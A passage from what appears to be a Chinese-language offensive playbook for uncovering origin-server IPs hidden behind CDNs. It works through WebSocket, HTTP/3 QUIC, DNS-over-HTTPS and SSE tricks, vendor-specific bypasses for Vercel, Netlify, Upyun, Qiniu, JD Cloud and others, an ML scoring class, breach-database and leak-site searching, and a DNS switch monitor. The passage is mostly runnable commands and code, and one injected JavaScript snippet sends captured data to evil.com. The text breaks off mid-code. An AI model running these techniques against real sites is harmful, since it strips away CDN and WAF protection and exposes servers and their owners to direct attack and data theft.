# 如果CDN不代理WebSocket → 浏览器直接连接源站
# 利用浏览器开发者工具 → Network → WS标签 → 查看Remote Address
# 在JavaScript中提取:
# 注入到页面:
javascript:"
let ws = new WebSocket('wss://<target>/ws');
ws.onopen = () => {
    // 某些浏览器在WebSocket中暴露远程地址
    console.log('WebSocket connected');
    // 使用 Performance API 获取连接信息
    setTimeout(() => {
        let entries = performance.getEntriesByType('resource');
        entries.forEach(e => {
            if (e.name.includes('ws')) {
                console.log('WS Resource:', e.name, e.serverTiming);
            }
        });
    }, 1000);
};
"

# === 4. WebSocket 子协议绕过 ===
# 某些CDN只代理标准WebSocket, 不代理特定子协议
# 使用子协议触发CDN直通 → 暴露源站
python3 -c "
import websocket
# 使用非标准子协议
ws = websocket.create_connection('wss://<target>/ws',
    subprotocols=['x-custom-protocol', 'mqtt', 'stomp'])
# 如果成功连接且返回非CDN特征 → 直接连接到源站
"
```

### 56.2 HTTP/3 QUIC 专属溯源

HTTP/3 基于 QUIC (UDP 443)，许多 CDN 的 HTTP/3 支持不完善或配置与 HTTP/2 不同，形成新的溯源窗口。

```bash
# === 1. HTTP/3 QUIC 连接直接暴露源站 ===
# 某些CDN不支持HTTP/3 → 源站直接暴露在UDP 443上
# 某些CDN支持HTTP/3但与HTTP/2配置不同 → 证书差异

# 检测目标是否支持HTTP/3
curl -sI --http3-only https://<target> -o /dev/null -w "HTTP/3: %{http_version}\n"

# 使用 --http3 直接连接 (可能绕过CDN)
curl -sI --http3 https://<target> 2>&1 | head -20

# 使用 alt-svc 发现HTTP/3端点
curl -sI https://<target> | grep -i "alt-svc"
# alt-svc: h3=":443" → 源站支持HTTP/3在443端口
# alt-svc: h3="<origin_ip>:443" → 直接暴露源站IP!

# === 2. QUIC 连接指纹差异 ===
# CDN节点的QUIC配置 vs 源站的QUIC配置:
# - QUIC Transport Parameters
# - 支持的QUIC版本
# - 连接ID长度
# - 流控制参数

# 提取QUIC指纹 (使用 tcpdump + quic 解析)
tcpdump -i any -w quic.pcap udp port 443 &
# 在另一个终端:
curl --http3 https://<candidate_ip> -o /dev/null
# 停止抓包, 分析QUIC握手
tshark -r quic.pcap -Y "quic" -T fields \
  -e quic.version -e quic.tls.handshake.extensions.supported_version

# === 3. QUIC 0-RTT 绕过 CDN ===
# 如果CDN不支持0-RTT但源站支持 → 0-RTT连接可能直连源站
# 0-RTT绕过CDN缓存, 直接到达源站

# 测试0-RTT
python3 -c "
import socket, ssl, struct

# 构造QUIC Initial包 (0-RTT)
# 0-RTT数据在TLS 1.3 early_data中发送
# 如果CDN不支持0-RTT → 包被转发到源站 → 源站响应暴露自身

# 注意: 需要完整的QUIC实现, 可以使用 aioquic 库
from aioquic.quic.configuration import QuicConfiguration
config = QuicConfiguration(is_client=True, alpn_protocols=['h3'])
config.max_early_data = 16384  # 启用0-RTT
"

# === 4. HTTP/3 与 HTTP/2 证书差异 ===
# 某些CDN为HTTP/3和HTTP/2使用不同的证书
# 对比两个协议的证书SHA256

# HTTP/2 证书SHA256
H2_SHA256=$(echo | openssl s_client -connect <target>:443 -servername <target> \
  -alpn h2 2>/dev/null | openssl x509 -noout -fingerprint -sha256)

# HTTP/3 证书SHA256 (需要 quiche 或 curl --http3)
H3_SHA256=$(curl --http3-only -skv https://<target> 2>&1 | \
  grep -oP 'SHA256:[A-Fa-f0-9:]+' | head -1)

echo "H2: $H2_SHA256"
echo "H3: $H3_SHA256"
# 如果不同 → 可能HTTP/3直接连接到了源站
```

### 56.3 DNS-over-HTTPS 绕过与 DNS 隐蔽查询

```bash
# === 1. DoH 绕过 CDN DNS 保护 ===
# 某些CDN通过DNS劫持/修改实现流量牵引
# 使用DoH可以绕过CDN的DNS层面保护, 获得真实的DNS解析

# Cloudflare DoH
curl -s "https://cloudflare-dns.com/dns-query?name=<target>&type=A" \
  -H "accept: application/dns-json" | python3 -m json.tool

# Google DoH
curl -s "https://dns.google/resolve?name=<target>&type=A" | python3 -m json.tool

# 对比不同DoH提供商的解析结果
# 如果结果不同 → 可能某个提供商返回了源站IP (未经过CDN)

# 批量DoH查询对比
for doh in \
  "https://cloudflare-dns.com/dns-query" \
  "https://dns.google/resolve" \
  "https://dns.quad9.net/dns-query" \
  "https://doh.pub/dns-query" \
  "https://dns.alidns.com/dns-query"; do
  echo "=== $doh ==="
  curl -s "${doh}?name=<target>&type=A" -H "accept: application/dns-json" | \
    python3 -c "import json,sys; d=json.load(sys.stdin); [print(a['data']) for a in d.get('Answer',[])]"
done

# === 2. DNS over TLS (DoT) 绕过 ===
# 类似DoH, 但使用TLS 853端口
dig +tls <target> @1.1.1.1
dig +tls <target> @8.8.8.8

# === 3. DNS 历史记录聚合查询 (多源) ===
# 聚合多个被动DNS源, 找最早的A记录

# 多源查询脚本:
python3 -c "
import requests, json

target = '<root_domain>'
sources = {
    'securitytrails': f'https://api.securitytrails.com/v1/history/{target}/dns/a',
    'virustotal': f'https://www.virustotal.com/api/v3/domains/{target}/resolutions',
    'alienvault': f'https://otx.alienvault.com/api/v1/indicators/domain/{target}/passive_dns',
    'urlscan': f'https://urlscan.io/api/v1/search/?q=domain:{target}',
}

# 聚合所有源的IP + 时间
# 按时间排序 → 最早的IP = CDN接入前的源站
# 按IP出现频率 → 少数IP可能是源站, 多数IP是CDN节点
"

# === 4. 实时 DNS 变更监控 (无需API Key) ===
# 每5分钟查询DNS → 检测IP变更 → 配置变更时可能暴露源站

cat > dns_monitor.sh << 'EOF'
#!/bin/bash
TARGET="$1"
LOG="dns_history_${TARGET}.log"

while true; do
    TS=$(date -Iseconds)
    IPS=$(dig +short $TARGET @8.8.8.8 | sort | paste -sd, -)
    echo "$TS $IPS" >> $LOG

    # 检测变更
    PREV=$(tail -2 $LOG | head -1 | awk '{print $2}')
    if [ "$IPS" != "$PREV" ] && [ -n "$PREV" ]; then
        echo "[ALERT] DNS变更: $PREV → $IPS"
        # 新IP可能是源站 (CDN配置变更时短暂暴露)
    fi

    sleep 300  # 5分钟
done
EOF
chmod +x dns_monitor.sh
# ./dns_monitor.sh target.com
```

### 56.4 新增5家CDN厂商专项绕过

```bash
# === 新增厂商1: Vercel ===
# 特征: CNAME *.vercel-dns.com, Server: Vercel
# Vercel 使用 Serverless Functions, 无固定源站IP
# 绕过策略:
# 1. Vercel 部署的源码可能从GitHub公开repo泄露
# 2. 环境变量泄露 (vercel env pull)
# 3. .vercel 目录泄露 (CI/CD配置)
# 4. Vercel Analytics 数据泄露

# 检查Vercel特定路径
curl -sI "https://<target>/__vercel/health"
curl -sI "https://<target>/__vercel/error"
curl -sI "https://<target>/api/vercel"

# Vercel 子域名枚举
for sub in www staging dev preview; do
  curl -sI "https://$sub.<root_domain>"
done

# === 新增厂商2: Netlify ===
# 特征: CNAME *.netlify.app, Server: Netlify
# 绕过策略:
# 1. Netlify 部署源码可能从GitHub泄露
# 2. _redirects / _headers 文件泄露
# 3. Netlify Functions 环境变量泄露
# 4. Deploy Preview URL 泄露

curl -s "https://<target>/_redirects"
curl -s "https://<target>/_headers"
curl -s "https://<target>/.netlify/state.json"

# Netlify 子域名枚举
for sub in deploy-preview-{1..100}--<site>.netlify.app; do
  curl -sI "https://$sub"
done

# === 新增厂商3: Cloudflare R2 / Zero Trust ===
# Cloudflare R2 (对象存储) 可能暴露源站
# Cloudflare Zero Trust / Access / Tunnel 特定配置

# R2 公开桶检测
# 如果源站使用R2, 公开桶可能包含源站配置文件
curl -s "https://<target>.r2.dev"
curl -s "https://r2.cloudflarestorage.com/<bucket>"

# Cloudflare Access 绕过
# 检查是否有不使用Access的子域名
curl -sI "https://direct.<root_domain>"
curl -sI "https://origin.<root_domain>"

# === 新增厂商4: 火山引擎 CDN (ByteDance) ===
# 特征: CNAME *.volccdn.com / *.bytecdn.com
# 绕过策略:
# 1. 火山引擎CDN回源IP段: 146.56.x.x, 180.184.x.x
# 2. 火山引擎源站通常在字节跳动云
# 3. 历史DNS回溯效果较好

# 火山引擎IP段定向扫描
whois -h whois.radb.net -- '-i origin AS137673' | grep 'route:' | awk '{print $2}'

# === 新增厂商5: Edgio (原Limelight) ===
# 特征: CNAME *.llnw.net / *.edg.io
# 老牌CDN, 早期配置可能有缺陷
# 绕过策略:
# 1. 历史DNS回溯 (Limelight时代配置)
# 2. 非标准端口不代理
# 3. 某些旧客户的配置未更新

# Edgio 特征检测
curl -sI https://<target> | grep -i "x-llnw\|x-edg\|server: ecd"
```

### 56.5 SSE/Server-Sent Events 源站发现

```bash
# === SSE (Server-Sent Events) 是 CDN 溯源的盲区 ===
# 原理: SSE 使用长连接 + 流式传输, 许多CDN不完全代理SSE
# SSE 连接可能绕过CDN直接到达源站

# 检测目标是否使用SSE
curl -s "https://<target>" | grep -i "EventSource\|text/event-stream"

# 手动SSE连接
python3 -c "
import requests

# 请求SSE端点
resp = requests.get('https://<target>/api/events',
    headers={'Accept': 'text/event-stream'},
    stream=True, timeout=15)

# 分析SSE流
for line in resp.iter_lines(decode_unicode=True):
    if line:
        print(f'SSE: {line}')
        # 搜索IP/内网地址
        import re
        ips = re.findall(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', line)
        if ips: print(f'  [IP LEAK] {ips}')
    if 'id:' in line or 'retry:' in line:
        # 某些SSE实现包含服务器信息
        print(f'  [META] {line}')
"

# SSE EventSource 连接测试 (浏览器端)
# 注入到页面:
javascript:"
let es = new EventSource('https://<target>/api/events');
es.onmessage = (e) => {
    console.log('SSE message:', e.data);
    // 检查是否包含源站信息
    if (e.data.includes('origin') || e.data.includes('host')) {
        fetch('https://evil.com/collect?sse=' + encodeURIComponent(e.data));
    }
};
es.onerror = (e) => {
    console.log('SSE error:', e.target.url);
    // 错误URL可能暴露源站
};
"
```
---
---

# Part V: 国内CDN专项绕过 + ML辅助溯源 + 暗网情报 + HTTP3 QUIC (v1.6 终极强化)

## §59. 域B终极强化: 国内CDN厂商专项绕过 + ML辅助溯源 + 暗网情报 + HTTP3 QUIC高级指纹 (v1.6)

> 将CDN溯源从"通用方法"升级为"精准打击"——覆盖国内5家CDN厂商专项绕过、机器学习辅助溯源评分、暗网情报收集、HTTP/3 QUIC协议指纹、实时CDN切换检测。

### 59.1 国内CDN厂商专项深度绕过 (又拍云/七牛云/UCloud/金山云/京东云)

```
国内CDN厂商特征速查表 (v1.6新增):

┌──────────────────────────────────────────────────────────────────────┐
│ 厂商       │ 域名特征                     │ 响应头指纹               │
├────────────┼──────────────────────────────┼──────────────────────────┤
│ 又拍云     │ .b0.aicdn.com / .b0.upaiyun  │ X-Upyun-* / Server: upyun│
│ 七牛云     │ .qiniudns.com / .qiniucdn    │ X-Qiniu-* / X-Reqid      │
│ UCloud     │ .ucloud.cn / .ufileos        │ X-UCloud-*                │
│ 金山云     │ .ksyuncdn.com / .ksyun.com   │ X-KSYN-* / Server: KSYUN │
│ 京东云     │ .jcloudcdn.com / .jdcloud    │ X-JDCloud-*               │
│ 又拍云     │ .b0.aicdn.com / .b0.upaiyun  │ X-Upyun-* / Server: upyun│
│ 知道创宇   │ .jiashule.com / .yunaqcdn    │ X-Jiasule-* / X-CDN      │
│ 百度云加速 │ .yunjiasu-cdn.net            │ X-Yunjiasu-* / Server: yunjiasu │
│ 360 CDN    │ .qhcdn.com / .qhimg          │ X-QH-* / Server: QHCache │
│ 网心云     │ .wuxcloud.com                │ X-Wux-*                   │
└──────────────────────────────────────────────────────────────────────┘
```

```bash
# === 1. 又拍云 (UPYUN) CDN 专项绕过 ===

# 又拍云特征识别
# CNAME: xxx.b0.aicdn.com 或 xxx.b0.upaiyun.com
# 响应头: X-Upyun-*, Server: upyun

# 绕过方法1: 利用又拍云的回源HOST配置
# 又拍云默认回源HOST与加速域名相同
# 但如果配置了自定义回源HOST → 可能泄露真实HOST名
curl -sI -H "Host: <target>" https://<target> | grep -i "upyun\|x-upyun\|x-source"

# 绕过方法2: 又拍云非标准端口回源
# 又拍云支持自定义回源端口
# 扫描非标准端口 (8443, 9443, 8080, 9090)
for port in 443 80 8443 9443 8080 9090 2083 10000; do
  curl -sI -m 3 --resolve <target>:$port:<cdn_ip> https://<target>:$port 2>/dev/null
done

# 绕过方法3: 又拍云源站IP泄露
# 又拍云在某些错误页面中可能暴露源站IP
# 触发错误: 请求超大文件/不存在的路径
curl -s "https://<target>/nonexistent_path_$(uuidgen)" 2>/dev/null | \
  grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u

# === 2. 七牛云 CDN 专项绕过 ===

# 七牛云特征识别
# CNAME: xxx.qiniudns.com 或 xxx.clouddn.com
# 响应头: X-Qiniu-*, X-Reqid, Server: nginx (七牛定制版)

# 绕过方法1: 七牛云融合CDN源站探测
# 七牛云融合CDN的源站配置可能在对HTTP/2的响应中泄露
curl -sI --http2 -H "Host: <target>" https://<target> 2>/dev/null | \
  grep -i "server\|x-qiniu\|x-reqid\|x-real-ip"

# 绕过方法2: 七牛云空间绑定域名泄露
# 如果目标使用了七牛云对象存储作为源站
# 空间绑定的加速域名可能直接暴露源站
curl -s "https://<target>/favicon.ico" -o /tmp/fav.ico
# 计算favicon hash → 在Shodan搜索
python3 -c "
import hashlib, base64
with open('/tmp/fav.ico', 'rb') as f:
    h = hashlib.md5(f.read()).hexdigest()
print(f'favicon_hash:{h}')
"

# 绕过方法3: 七牛云PCDN节点探测
# 七牛云PCDN节点不同于CDN节点
# 某些PCDN节点可能直接暴露源站
for sub in pcdn edge origin source; do
  nslookup "$sub.<target>" 2>/dev/null
done

# === 3. 金山云 CDN 专项绕过 ===

# 金山云特征识别
# CNAME: xxx.ksyuncdn.com
# 响应头: X-KSYN-*, Server: KSYUN

# 绕过方法: 金山云错误页面泄露
# 金山云CDN在回源失败时返回特定错误页面
# 错误页面中可能包含源站IP
curl -s -H "Host: <target>" -H "X-Forwarded-For: 127.0.0.1" \
  https://<target>/error_test_$(date +%s) 2>/dev/null

# 金山云非标准端口回源探测
for port in 443 80 8443 9443 8080 9090 9091; do
  echo "=== Port $port ==="
  curl -sI -m 3 --resolve <target>:$port:<cdn_ip> https://<target>:$port 2>/dev/null | head -5
done

# === 4. 京东云 CDN 专项绕过 ===

# 京东云特征识别
# CNAME: xxx.jcloudcdn.com 或 xxx.jdcloud-cdn.com
# 响应头: X-JDCloud-*, X-JD-Edge-*

# 绕过方法1: 京东云CDN IP段定向扫描
# 京东云CDN IP段:
#   110.40.0.0/15, 114.67.0.0/16, 116.196.0.0/16
# 使用Masscan扫描这些IP段寻找443端口开放
# masscan 110.40.0.0/15 -p443 --rate=10000 | grep <target>

# 绕过方法2: 京东云CDN回源IP泄露
# 京东云在HTTP响应中可能包含回源IP
curl -s -D - "https://<target>/" 2>/dev/null | \
  grep -i "x-jd\|x-real-ip\|x-jdcloud\|x-jd-edge"

# === 5. UCloud CDN 专项绕过 ===

# UCloud特征识别
# CNAME: xxx.ucloud.cn 或 xxx.ufileos.com
# 响应头: X-UCloud-*, Server: UCloud

# 绕过方法: UCloud PathPattern 回源
# UCloud支持自定义回源PathPattern
# 某些路径可能直接回源不经过CDN缓存
for path in /api /admin /backend /origin /direct /real /source; do
  echo "=== $path ==="
  curl -sI -m 3 "https://<target>$path" 2>/dev/null | grep -i "server\|x-ucloud"
done
```

### 59.2 机器学习辅助CDN溯源评分

```python
# === ML辅助CDN溯源评分系统 ===
# 使用机器学习提升溯源准确率，减少误报

import numpy as np
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib
import json

class MLCdnTracer:
    """机器学习辅助CDN溯源系统"""
    
    # 特征维度 (共28维)
    FEATURE_NAMES = [
        # TLS指纹特征 (4维)
        'ja3_hash_match', 'ja4_hash_match', 'cert_serial_match', 'cert_san_match',
        # HTTP特征 (6维)
        'http_status_match', 'http_title_similarity', 'http_body_hash_match',
        'http_server_header_match', 'http_content_type_match', 'http_redirect_match',
        # 网络特征 (4维)
        'ttl_value', 'open_ports_count', 'port_pattern_match', 'rtt_deviation',
        # 历史特征 (5维)
        'historical_dns_age', 'dns_change_frequency', 'reverse_dns_match',
        'asn_reputation', 'ip_range_cdn_overlap',
        # 行为特征 (5维)
        'response_time_consistency', 'error_page_similarity', 'favicon_hash_match',
        'ssl_cert_chain_match', 'http2_settings_match',
        # 元数据特征 (4维)
        'whois_org_match', 'geo_location_match', 'mx_records_overlap',
        'ptr_record_match',
    ]
    
    def __init__(self, model_path: str = None):
        if model_path:
            self.model = joblib.load(model_path)
        else:
            self.model = GradientBoostingClassifier(
                n_estimators=200,
                max_depth=8,
                learning_rate=0.05,
                subsample=0.8,
                random_state=42
            )
    
    def extract_features(self, target: str, candidate_ip: str) -> np.ndarray:
        """提取候选IP的特征向量"""
        features = []
        
        # 1. TLS指纹匹配
        cert_info = self.get_cert_info(candidate_ip)
        target_cert = self.get_cert_info(target)
        features.append(float(cert_info.get('ja3_hash') == target_cert.get('ja3_hash')))
        features.append(float(cert_info.get('ja4_hash') == target_cert.get('ja4_hash')))
        features.append(float(cert_info.get('serial') == target_cert.get('serial')))
        features.append(float(any(san in target for san in cert_info.get('sans', []))))
        
        # 2. HTTP特征匹配
        http_info = self.get_http_response(candidate_ip, target)
        target_http = self.get_http_response(target, target)
        features.append(float(http_info.get('status') == target_http.get('status')))
        features.append(self.calculate_title_similarity(
            http_info.get('title', ''), target_http.get('title', '')))
        features.append(float(http_info.get('body_hash') == target_http.get('body_hash')))
        features.append(float(http_info.get('server') == target_http.get('server')))
        features.append(float(http_info.get('content_type') == target_http.get('content_type')))
        features.append(float(http_info.get('redirect') == target_http.get('redirect')))
        
        # 3. 网络特征
        features.append(self.get_ttl(candidate_ip))
        features.append(len(self.get_open_ports(candidate_ip)))
        features.append(float(self.check_port_pattern(candidate_ip, target)))
        features.append(self.get_rtt_deviation(candidate_ip))
        
        # 4. 历史特征
        dns_history = self.get_dns_history(target)
        features.append(dns_history.get('age', 0))
        features.append(dns_history.get('change_frequency', 0))
        features.append(float(self.check_reverse_dns(candidate_ip, target)))
        features.append(self.get_asn_reputation(candidate_ip))
        features.append(self.get_cdn_overlap(candidate_ip))
        
        # 5. 行为特征
        features.append(self.get_response_consistency(candidate_ip, target))
        features.append(self.get_error_page_similarity(candidate_ip, target))
        features.append(float(self.get_favicon_hash(candidate_ip) == self.get_favicon_hash(target)))
        features.append(float(self.check_cert_chain(candidate_ip, target)))
        features.append(float(self.check_http2_settings(candidate_ip, target)))
        
        # 6. 元数据特征
        features.append(float(self.check_whois(candidate_ip, target)))
        features.append(float(self.check_geo(candidate_ip, target)))
        features.append(float(self.check_mx_overlap(candidate_ip, target)))
        features.append(float(self.check_ptr_record(candidate_ip, target)))
        
        return np.array(features).reshape(1, -1)
    
    def predict(self, target: str, candidate_ips: list) -> list:
        """批量预测候选IP的源站概率"""
        results = []
        for ip in candidate_ips:
            features = self.extract_features(target, ip)
            prob = self.model.predict_proba(features)[0][1]  # 源站概率
            results.append({
                'ip': ip,
                'probability': float(prob),
                'confidence': self.probability_to_confidence(prob),
                'features': {name: float(features[0][i]) 
                            for i, name in enumerate(self.FEATURE_NAMES)}
            })
        
        # 按概率排序
        results.sort(key=lambda x: x['probability'], reverse=True)
        return results
    
    def probability_to_confidence(self, prob: float) -> str:
        if prob > 0.95: return "确定"
        elif prob > 0.85: return "高度可信"
        elif prob > 0.70: return "可能"
        elif prob > 0.50: return "猜测"
        else: return "排除"
    
    def train(self, training_data: list):
        """训练模型"""
        X = []
        y = []
        for sample in training_data:
            features = self.extract_features(sample['target'], sample['ip'])
            X.append(features[0])
            y.append(sample['is_origin'])
        
        X = np.array(X)
        y = np.array(y)
        
        # 训练
        self.model.fit(X, y)
        
        # 保存模型
        joblib.dump(self.model, 'ml_cdn_tracer.pkl')
        
        # 输出特征重要性
        importances = self.model.feature_importances_
        for name, imp in sorted(zip(self.FEATURE_NAMES, importances), 
                                key=lambda x: x[1], reverse=True):
            print(f"  {name}: {imp:.4f}")
```

### 59.3 暗网情报溯源

```python
# === 暗网情报CDN溯源 ===
# 从暗网/深网收集目标信息辅助溯源

class DarknetIntelligence:
    """暗网情报溯源收集"""
    
    # 情报来源
    SOURCES = {
        'ransomware_leaks': [
            # 勒索软件团伙泄露站点
            # 经常包含目标企业的网络拓扑、IP地址等信息
        ],
        'data_breach_dumps': [
            # 数据泄露转储 — 可能包含服务器配置
            # 在泄露数据中搜索目标域名
        ],
        'paste_sites': [
            # Pastebin / Ghostbin / PrivateBin
            # 搜索目标域名和IP
        ],
        'hacker_forums': [
            # 黑客论坛 — 出售/讨论目标
            # 可能包含目标网络信息
        ],
        'telegram_channels': [
            # Telegram 频道 — 泄露数据交易
            # 搜索目标域名
        ],
        'github_leaks': [
            # GitHub 公开仓库 — 配置文件泄露
            # 搜索: <domain> config nginx apache vhost
        ],
    }
    
    def search_darknet(self, domain: str) -> list:
        """搜索暗网中关于目标的所有信息"""
        findings = []
        
        # 1. GitHub 配置泄露搜索
        github_queries = [
            f'"{domain}" filename:nginx',
            f'"{domain}" filename:apache',
            f'"{domain}" filename:vhost',
            f'"{domain}" filename:proxy',
            f'"{domain}" upstream',
            f'"{domain}" server_name',
            f'"{domain}" proxy_pass',
            f'"{domain}" backend',
            f'"{domain}" origin',
        ]
        
        for query in github_queries:
            # 搜索GitHub
            results = self.search_github(query)
            for r in results:
                findings.append({
                    'source': 'github',
                    'query': query,
                    'url': r['url'],
                    'snippet': r['snippet'],
                    'date': r['date'],
                })
        
        # 2. Pastebin 搜索
        paste_queries = [
            domain,
            f'{domain} ip',
            f'{domain} server',
            f'{domain} config',
        ]
        
        for query in paste_queries:
            # 使用 psbdmp.com API 搜索Pastebin历史
            results = self.search_pastebin(query)
            for r in results:
                findings.append({
                    'source': 'pastebin',
                    'query': query,
                    'content': r['content'][:500],
                    'date': r['date'],
                })
        
        # 3. 数据泄露数据库搜索
        breach_sources = [
            'haveibeenpwned.com',
            'dehashed.com',
            'intelx.io',
            'snusbase.com',
        ]
        
        for source in breach_sources:
            results = self.search_breach_db(source, domain)
            for r in results:
                if 'ip' in r or 'server' in r:
                    findings.append({
                        'source': source,
                        'type': 'breach',
                        'data': r,
                    })
        
        return findings
    
    def extract_ips_from_findings(self, findings: list) -> list:
        """从暗网情报中提取IP地址"""
        import re
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        
        ips = []
        for f in findings:
            content = str(f.get('snippet', '') or f.get('content', ''))
            found_ips = re.findall(ip_pattern, content)
            for ip in found_ips:
                # 过滤私有IP
                if not ip.startswith(('10.', '172.16.', '192.168.')):
                    ips.append({
                        'ip': ip,
                        'source': f['source'],
                        'context': content[:200],
                    })
        
        return ips
```

### 59.4 HTTP/3 QUIC 高级指纹提取

```python
# === HTTP/3 QUIC 协议指纹提取 ===
# QUIC指纹可以区分CDN节点和源站服务器

class QUICFingerprinter:
    """HTTP/3 QUIC 指纹提取器"""
    
    def extract_quic_fingerprint(self, host: str, port: int = 443) -> dict:
        """提取QUIC连接指纹"""
        import socket, struct, ssl, hashlib
        
        # 1. QUIC Initial Packet 抓取
        # QUIC使用UDP，需要发送Initial包并解析响应
        
        fingerprint = {
            'version': None,
            'supported_versions': [],
            'transport_params': {},
            'tls_cipher_suites': [],
            'tls_extensions': [],
            'quic_version_negotiation': False,
            'connection_id_length': 0,
            'max_idle_timeout': 0,
            'max_udp_payload_size': 0,
            'initial_max_data': 0,
            'initial_max_stream_data_bidi_local': 0,
            'initial_max_stream_data_bidi_remote': 0,
            'initial_max_stream_data_uni': 0,
            'initial_max_streams_bidi': 0,
            'initial_max_streams_uni': 0,
            'ack_delay_exponent': 0,
            'max_ack_delay': 0,
            'disable_active_migration': False,
            'active_connection_id_limit': 0,
        }
        
        # 2. QUIC支持的版本
        # 不同服务器支持的QUIC版本不同
        versions = self.probe_quic_versions(host, port)
        fingerprint['supported_versions'] = versions
        
        # 3. HTTP/3 Alt-Svc 响应头
        # 通过HTTPS请求获取Alt-Svc头
        alt_svc = self.get_alt_svc(host)
        if alt_svc:
            fingerprint['alt_svc'] = alt_svc
        
        # 4. QUIC 传输参数
        # 从Initial包的ServerHello中提取
        params = self.extract_transport_params(host, port)
        fingerprint['transport_params'] = params
        
        # 5. 生成QUIC指纹哈希
        fingerprint['quic_hash'] = self.compute_quic_hash(fingerprint)
        
        return fingerprint
    
    def probe_quic_versions(self, host: str, port: int) -> list:
        """探测服务器支持的QUIC版本"""
        # QUIC版本号 (2026):
        known_versions = {
            0x00000001: 'QUIC v1 (RFC 9000)',
            0xff00001d: 'QUIC v2 (draft)',
            0x709a50c4: 'QUIC v2 (draft-ietf-quic-v2)',
            0xfaceb002: 'Google QUIC Q050',
            0xfaceb00e: 'Google QUIC Q046',
            0xfaceb00f: 'Google QUIC Q044',
            0xfaceb010: 'Google QUIC Q043',
        }
        
        supported = []
        for version_id, version_name in known_versions.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # 构建QUIC版本探测包
                pkt = self.build_version_probe(version_id)
                sock.sendto(pkt, (host, port))
                
                resp, _ = sock.recvfrom(1500)
                sock.close()
                
                # 解析响应
                if resp and len(resp) > 0:
                    supported.append({
                        'version_id': hex(version_id),
                        'version_name': version_name,
                    })
            except:
                continue
        
        return supported
    
    def build_version_probe(self, version: int) -> bytes:
        """构建QUIC版本探测包"""
        import random
        
        # QUIC Long Header
        packet = bytearray()
        # Header Form (1) + Fixed Bit (1) + Long Packet Type (2) + Reserved (2) + Packet Number Length (2)
        packet.append(0xC0)  # 11000000 = Long Header + Initial
        packet.extend(struct.pack('>I', version))  # Version
        # Destination Connection ID (8 bytes)
        dcid = bytes(random.getrandbits(8) for _ in range(8))
        packet.append(len(dcid))
        packet.extend(dcid)
        # Source Connection ID (8 bytes)
        scid = bytes(random.getrandbits(8) for _ in range(8))
        packet.append(len(scid))
        packet.extend(scid)
        # Token (empty)
        packet.append(0x00)
        # Length (伪)
        packet.extend(struct.pack('>I', 1200))
        # Packet Number
        packet.append(0x00)
        
        return bytes(packet)
    
    def compute_quic_hash(self, fingerprint: dict) -> str:
        """计算QUIC指纹哈希"""
        import hashlib, json
        
        # 选取稳定的指纹特征
        stable_features = {
            'versions': sorted(fingerprint.get('supported_versions', [])),
            'max_idle_timeout': fingerprint.get('max_idle_timeout', 0),
            'max_udp_payload_size': fingerprint.get('max_udp_payload_size', 0),
            'initial_max_data': fingerprint.get('initial_max_data', 0),
            'disable_active_migration': fingerprint.get('disable_active_migration', False),
        }
        
        fp_str = json.dumps(stable_features, sort_keys=True)
        return hashlib.sha256(fp_str.encode()).hexdigest()[:16]
    
    def get_alt_svc(self, host: str) -> list:
        """获取HTTP Alt-Svc响应头 (包含QUIC/H3信息)"""
        import subprocess
        
        try:
            result = subprocess.run([
                'curl', '-sI', '-m', '5',
                f'https://{host}',
                '-H', 'Accept: */*',
            ], capture_output=True, text=True, timeout=10)
            
            alt_svc_entries = []
            for line in result.stdout.split('\n'):
                if line.lower().startswith('alt-svc:'):
                    # Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
                    entries = line.split(':', 1)[1].strip()
                    for entry in entries.split(','):
                        entry = entry.strip()
                        alt_svc_entries.append(entry)
            
            return alt_svc_entries
        except:
            return []
```

### 59.5 实时CDN切换检测

```python
# === 实时CDN切换检测 ===
# 检测目标是否正在切换CDN → 在切换窗口期捕获源站IP

class CDNSwitchDetector:
    """实时CDN切换检测器"""
    
    def __init__(self):
        self.previous_dns = {}
        self.previous_cname = {}
        self.switch_events = []
    
    def monitor_dns_changes(self, target: str, interval: int = 60):
        """持续监控DNS变化 → 检测CDN切换"""
        import time
        import dns.resolver
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1', '223.5.5.5']
        
        print(f"[*] 开始监控 {target} 的DNS变化 (间隔 {interval}s)")
        
        while True:
            try:
                # 查询A记录
                answers = resolver.resolve(target, 'A')
                current_ips = sorted([str(r) for r in answers])
                
                # 查询CNAME
                try:
                    cname_answers = resolver.resolve(target, 'CNAME')
                    current_cname = str(cname_answers[0])
                except:
                    current_cname = 'NONE'
                
                # 检测变化
                if target in self.previous_dns:
                    prev_ips = self.previous_dns[target]
                    prev_cname = self.previous_cname.get(target)
                    
                    # IP变化
                    new_ips = set(current_ips) - set(prev_ips)
                    removed_ips = set(prev_ips) - set(current_ips)
                    
                    if new_ips or removed_ips:
                        event = {
                            'timestamp': time.time(),
                            'type': 'dns_change',
                            'new_ips': list(new_ips),
                            'removed_ips': list(removed_ips),
                            'new_cname': current_cname if current_cname != prev_cname else None,
                        }
                        self.switch_events.append(event)
                        
                        print(f"[!] DNS变化检测!")
                        if new_ips:
                            print(f"    新增IP: {new_ips}")
                            # 可能是源站IP! (CDN回退/切换)
                            for ip in new_ips:
                                self.verify_potential_origin(target, ip)
                        if removed_ips:
                            print(f"    移除IP: {removed_ips}")
                        if current_cname != prev_cname:
                            print(f"    CNAME: {prev_cname} → {current_cname}")
                
                # 更新缓存
                self.previous_dns[target] = current_ips
                self.previous_cname[target] = current_cname
                
            except Exception as e:
                print(f"[-] DNS查询错误: {e}")
            
            time.sleep(interval)
    
    def verify_potential_origin(self, target: str, ip: str):
        """验证是否为源站IP"""
        import subprocess
        
        # 1. 直接HTTPS连接
        try:
            result = subprocess.run([
                'curl', '-sI', '-m', '5', '-k',
                f'--resolve', f'{target}:443:{ip}',
                f'https://{target}',
            ], capture_output=True, text=True, timeout=10)
            
            # 2. 检查响应 — 是否与CDN节点不同
            if 'cloudflare' not in result.stdout.lower() and \
               'cdn' not in result.stdout.lower() and \
               'TencentEdgeOne' not in result.stdout:
